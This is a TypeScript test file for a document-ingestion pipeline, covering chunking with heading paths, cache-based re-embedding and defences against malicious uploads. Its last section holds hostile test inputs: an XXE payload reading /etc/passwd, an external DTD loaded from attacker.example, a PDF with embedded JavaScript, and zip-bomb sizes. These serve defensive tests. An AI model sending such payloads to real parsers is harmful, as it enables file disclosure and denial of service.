import { describe, expect, it, vi } from "vitest";
import { chunkMarkdown, countTokens, toBlocks } from "../src/pipeline/chunk.js";
import {
  checkArchive,
  checkPdf,
  checkSize,
  checkType,
  checkXml,
  LIMITS,
  withParseTimeout,
} from "../src/pipeline/guards.js";
import {
  chunkStage,
  cleanStage,
  type Embedder,
  embedStage,
  isFresh,
  parseStage,
  reindexCost,
} from "../src/pipeline/stages.js";

/**
 * The ingestion pipeline (doc 03 §A1) and the malicious-document defences
 * (threat-model §T6).
 *
 * Two exit criteria the session names, tested directly: chunks carry correct
 * heading paths, and re-ingesting unchanged files does zero re-parsing.
 */

const DOC = `# Billing

Intro paragraph about billing.

## Refunds

Refunds are processed within 14 days.

### Eligibility

Only orders under 90 days old qualify.

\`\`\`ts
const refund = await client.refund(orderId);
\`\`\`

## Invoices

Invoices are issued monthly.
`;

describe("heading paths", () => {
  it("carries the full path down to the deepest heading", () => {
    // "Billing → Refunds → Eligibility" rather than an anonymous fragment. A
    // chunk without this cannot be cited and cannot be told apart from a
    // similar fragment elsewhere in the document.
    const chunks = chunkMarkdown(DOC, { maxTokens: 20 });
    const eligibility = chunks.find((c) => c.content.includes("90 days"));

    expect(eligibility?.headingPath).toEqual(["Billing", "Refunds", "Eligibility"]);
  });

  it("pops back up when a shallower heading follows a deeper one", () => {
    // The bug this catches: treating headings as a stack that only ever grows,
    // so Invoices inherits Eligibility.
    const chunks = chunkMarkdown(DOC, { maxTokens: 20 });
    const invoices = chunks.find((c) => c.content.includes("issued monthly"));

    expect(invoices?.headingPath).toEqual(["Billing", "Invoices"]);
  });

  it("gives content before any heading an empty path rather than inventing one", () => {
    const chunks = chunkMarkdown("Loose text with no heading at all.");

    expect(chunks[0]?.headingPath).toEqual([]);
  });
});

describe("structures that must not be cut", () => {
  it("keeps a code fence whole even when it exceeds the budget", () => {
    // Half a fence retrieves as prose, embeds as noise, and — repeated back to
    // a user — gives them something that does not run.
    const long = [
      "# Setup",
      "",
      "```bash",
      ...Array(50).fill("npm install some-package"),
      "```",
    ].join("\n");

    const chunks = chunkMarkdown(long, { maxTokens: 30 });
    const fenced = chunks.filter((c) => c.content.includes("```"));

    expect(fenced).toHaveLength(1);
    expect(fenced[0]?.content.match(/```/g)).toHaveLength(2);
  });

  it("keeps a table whole, because half a table has lost its header row", () => {
    const table = [
      "# Plans",
      "",
      "| Plan | Price |",
      "| --- | --- |",
      "| Pro | 40 |",
      "| Team | 90 |",
    ].join("\n");

    const blocks = toBlocks(table);
    const tableBlock = blocks.find((b) => b.text.includes("| Pro |"));

    expect(tableBlock?.text).toContain("| Plan | Price |");
  });

  it("does not lose the rest of a document after an unterminated fence", () => {
    // A malformed document is a bad document, not a reason to drop content.
    const chunks = chunkMarkdown("# A\n\n```ts\nconst x = 1;\n");

    expect(chunks.map((c) => c.content).join("")).toContain("const x = 1;");
  });
});

describe("chunk sizing", () => {
  it("splits on block boundaries rather than mid-paragraph", () => {
    const chunks = chunkMarkdown(DOC, { maxTokens: 25 });

    for (const chunk of chunks) {
      expect(chunk.content.trim()).toBe(chunk.content);
      expect(chunk.content).not.toMatch(/^\w+,\s*$/);
    }
  });

  it("numbers chunks in document order", () => {
    const chunks = chunkMarkdown(DOC, { maxTokens: 25 });

    expect(chunks.map((c) => c.seq)).toEqual(chunks.map((_c, i) => i));
  });

  it("content-addresses each chunk", () => {
    const a = chunkMarkdown(DOC, { maxTokens: 25 });
    const b = chunkMarkdown(DOC, { maxTokens: 25 });

    expect(a.map((c) => c.contentSha256)).toEqual(b.map((c) => c.contentSha256));
  });

  it("approximates tokens above word count, since BPE splits words", () => {
    expect(countTokens("one two three four")).toBeGreaterThanOrEqual(4);
  });
});

describe("re-ingesting unchanged content does no work", () => {
  const embedder = (calls: string[][]): Embedder => ({
    id: "bge-small-en-v1.5",
    embed: async (texts) => {
      calls.push([...texts]);
      return texts.map(() => [0.1, 0.2, 0.3]);
    },
  });

  it("skips a stage whose input hash is unchanged", () => {
    const parsed = parseStage(DOC, "abc");

    expect(isFresh(parsed, "abc")).toBe(true);
    expect(isFresh(parsed, "def")).toBe(false);
  });

  it("re-embeds only the chunks whose content actually changed", async () => {
    // The exit criterion, and the reason the whole design is stage-addressable:
    // on a docs-site re-crawl this is forty chunks rather than four thousand.
    const calls: string[][] = [];
    const e = embedder(calls);

    const first = await embedStage(chunkStage(cleanStage(parseStage(DOC, "v1"))), e);
    const cache = new Map(first.value.map((c) => [c.contentSha256, c.embedding]));

    const edited = DOC.replace("issued monthly", "issued quarterly");
    const second = await embedStage(chunkStage(cleanStage(parseStage(edited, "v2"))), e, cache);

    expect(calls[0]?.length ?? 0).toBeGreaterThan(1);
    // Exactly the changed paragraph.
    expect(calls[1]).toHaveLength(1);
    expect(calls[1]?.[0]).toContain("quarterly");
    expect(second.value.every((c) => c.embedding.length === 3)).toBe(true);
  });

  it("does not call the embedder at all when nothing changed", async () => {
    const calls: string[][] = [];
    const e = embedder(calls);

    const first = await embedStage(chunkStage(cleanStage(parseStage(DOC, "v1"))), e);
    const cache = new Map(first.value.map((c) => [c.contentSha256, c.embedding]));
    calls.length = 0;

    await embedStage(chunkStage(cleanStage(parseStage(DOC, "v1"))), e, cache);

    expect(calls).toEqual([]);
  });

  it("invalidates the vectors when the embedding model changes", async () => {
    // Two vector spaces mixed in one index degrades retrieval quietly and is
    // very hard to diagnose, so the model id is part of the stage's input.
    const chunks = chunkStage(cleanStage(parseStage(DOC, "v1")));
    const a = await embedStage(chunks, { id: "bge-small", embed: async (t) => t.map(() => [1]) });
    const b = await embedStage(chunks, { id: "e5-small", embed: async (t) => t.map(() => [1]) });

    expect(a.inputSha256).not.toBe(b.inputSha256);
  });

  it("invalidates the chunks when the chunking config changes", () => {
    const cleaned = cleanStage(parseStage(DOC, "v1"));

    expect(chunkStage(cleaned, { maxTokens: 200 }).inputSha256).not.toBe(
      chunkStage(cleaned, { maxTokens: 400 }).inputSha256,
    );
  });

  it("reports how much a re-index would cost before running it", () => {
    const chunks = chunkMarkdown(DOC, { maxTokens: 25 });
    const cache = new Map(chunks.slice(0, 2).map((c) => [c.contentSha256, [0]]));

    expect(reindexCost(chunks, cache)).toEqual({
      total: chunks.length,
      toEmbed: chunks.length - 2,
    });
  });
});

describe("cleaning is conservative", () => {
  it("drops cookie banners and skip links", () => {
    const cleaned = cleanStage(parseStage("Skip to main content\n\nReal content here.", "x"));

    expect(cleaned.value).toBe("Real content here.");
  });

  it("keeps a real paragraph that happens to mention cookies", () => {
    // An aggressive cleaner produces a knowledge base that is confidently
    // missing something, which is worse than one carrying a nav bar.
    const text = "We use cookies to keep you signed in. See the privacy policy.";
    const cleaned = cleanStage(parseStage(text, "x"));

    expect(cleaned.value).toBe(text);
  });
});

describe("malicious documents are refused", () => {
  it("rejects a file larger than the cap", () => {
    expect(checkSize(LIMITS.maxBytes + 1).ok).toBe(false);
    expect(checkSize(1024).ok).toBe(true);
  });

  it("rejects a zip bomb by compression ratio", () => {
    // 42.zip: a few kilobytes that expand to petabytes.
    const check = checkArchive([{ compressedSize: 42_000, uncompressedSize: 4_500_000_000 }]);

    expect(check.ok).toBe(false);
    if (check.ok) return;
    expect(check.denial.reason).toBe("archive_bomb");
  });

  it("rejects a bomb assembled from many mildly-compressed entries", () => {
    // Ratio alone would let this through, which is why total size is checked too.
    const entries = Array.from({ length: 200 }, () => ({
      compressedSize: 1_000_000,
      uncompressedSize: 10_000_000,
    }));

    expect(checkArchive(entries).ok).toBe(false);
  });

  it("rejects an entry claiming size from nothing", () => {
    expect(checkArchive([{ compressedSize: 0, uncompressedSize: 1_000_000 }]).ok).toBe(false);
  });

  it("accepts an ordinary archive", () => {
    expect(checkArchive([{ compressedSize: 100_000, uncompressedSize: 400_000 }]).ok).toBe(true);
  });

  it("rejects XXE — declared entities", () => {
    const xxe = `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`;
    const check = checkXml(xxe);

    expect(check.ok).toBe(false);
    if (check.ok) return;
    expect(check.denial.reason).toBe("xxe");
  });

  it("rejects an external DTD, which is the same attack with fewer steps", () => {
    expect(checkXml(`<!DOCTYPE note SYSTEM "http://attacker.example/evil.dtd"><note/>`).ok).toBe(
      false,
    );
  });

  it("accepts ordinary XML", () => {
    expect(checkXml(`<?xml version="1.0"?><document><p>Hello</p></document>`).ok).toBe(true);
  });

  it("rejects a PDF carrying JavaScript", () => {
    const pdf = new TextEncoder().encode("%PDF-1.7\n/OpenAction << /JS (app.alert(1)) >>");
    const check = checkPdf(pdf);

    expect(check.ok).toBe(false);
    if (check.ok) return;
    expect(check.denial.reason).toBe("active_content");
  });

  it("accepts a plain PDF", () => {
    expect(checkPdf(new TextEncoder().encode("%PDF-1.7\n1 0 obj << /Type /Catalog >>")).ok).toBe(
      true,
    );
  });

  it("rejects SVG outright rather than trying to sanitise it", () => {
    // Sanitising means keeping up with every smuggling trick forever, against
    // an attacker who only has to win once. Nothing here needs to read SVG.
    const check = checkType("image/svg+xml");

    expect(check.ok).toBe(false);
    if (check.ok) return;
    expect(check.denial.reason).toBe("active_content");
  });

  it("accepts the declared document types", () => {
    for (const type of ["application/pdf", "text/markdown", "text/csv", "application/json"]) {
      expect(checkType(type).ok, type).toBe(true);
    }
    expect(checkType("application/x-msdownload").ok).toBe(false);
  });

  it("gives up on a parse that hangs", async () => {
    // A parser that hangs on a crafted file is denial of service costing the
    // attacker one upload.
    const result = await withParseTimeout(() => new Promise(() => undefined), 30);

    expect(result.ok).toBe(false);
    if (result.ok) return;
    expect(result.denial.reason).toBe("timeout");
  });

  it("lets an ordinary parse finish", async () => {
    const result = await withParseTimeout(async () => "parsed", 1_000);

    expect(result).toEqual({ ok: true, value: "parsed" });
  });

  it("hands the parser a signal so it can stop its own work", async () => {
    const seen = vi.fn();
    await withParseTimeout(async (signal) => {
      signal.addEventListener("abort", seen);
      await new Promise((r) => setTimeout(r, 60));
      return null;
    }, 20).catch(() => undefined);

    expect(seen).toHaveBeenCalled();
  });
});
